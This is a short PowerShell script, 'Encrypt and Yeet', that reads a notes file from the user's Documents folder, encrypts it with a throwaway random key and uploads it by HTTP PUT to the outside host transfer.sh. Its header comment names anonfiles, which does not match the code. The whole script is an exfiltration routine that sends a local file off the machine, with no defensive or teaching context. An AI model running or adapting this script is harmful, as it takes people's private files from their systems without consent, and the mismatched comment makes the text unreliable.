# Encrypt and Yeet - Encrypts selected file and uploads to anonfiles
$file = "$env:USERPROFILE\\Documents\\notes.txt"
$enc = "$env:TEMP\\enc_data.bin"
$key = New-Object Byte[] 16; (New-Object Security.Cryptography.RNGCryptoServiceProvider).GetBytes($key)
$content = Get-Content $file -Raw | ConvertTo-SecureString -AsPlainText -Force
$content | ConvertFrom-SecureString -Key $key | Set-Content $enc
Invoke-WebRequest -Uri "https://transfer.sh/enc_data.bin" -InFile $enc -Method Put
